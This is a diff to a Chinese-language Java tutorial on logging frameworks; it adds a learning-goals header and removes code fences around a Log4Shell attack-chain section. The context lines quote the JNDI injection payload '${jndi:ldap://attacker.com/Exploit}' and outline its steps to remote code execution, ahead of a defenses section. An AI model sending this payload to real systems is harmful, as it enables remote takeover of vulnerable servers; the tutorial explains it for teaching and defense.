@@ -1,3 +1,16 @@
+## 前置知识
+
+- [Java 单元测试](/java/087-JavaUnitTest)：建议先完成前一篇的学习
+
+## 学习目标
+
+- 掌握「0. 本节阅读指引（先读这一节）」的核心机制、典型用法与常见陷阱
+- 掌握「1. 历史动机与演化」的核心机制、典型用法与常见陷阱
+- 掌握「2. 形式化定义」的核心机制、典型用法与常见陷阱
+- 掌握「3. 理论推导：日志框架内部机制深度剖析」的核心机制、典型用法与常见陷阱
+- 掌握「4. 代码示例：从入门到进阶的完整实战」的核心机制、典型用法与常见陷阱
+
+
 ## 0. 本节阅读指引（先读这一节）
 
 本篇是「日志系统」，含理论章节。
@@ -1686,7 +1699,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 
 #### 8.5.2 攻击链路
 
-```
 1. 攻击者发送 HTTP 请求，User-Agent: ${jndi:ldap://attacker.com/Exploit}
 2. 应用记录日志：logger.info("User-Agent: {}", userAgent)
 3. Log4j 2 解析 ${jndi:...}，调用 JndiLookup.lookup()
@@ -1694,7 +1706,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 5. attacker.com 返回一个 RMI 引用，指向恶意类的 Codebase
 6. 应用从 Codebase 下载并执行恶意类
 7. 攻击者获得 RCE 权限
-```
 
 #### 8.5.3 防御措施
 
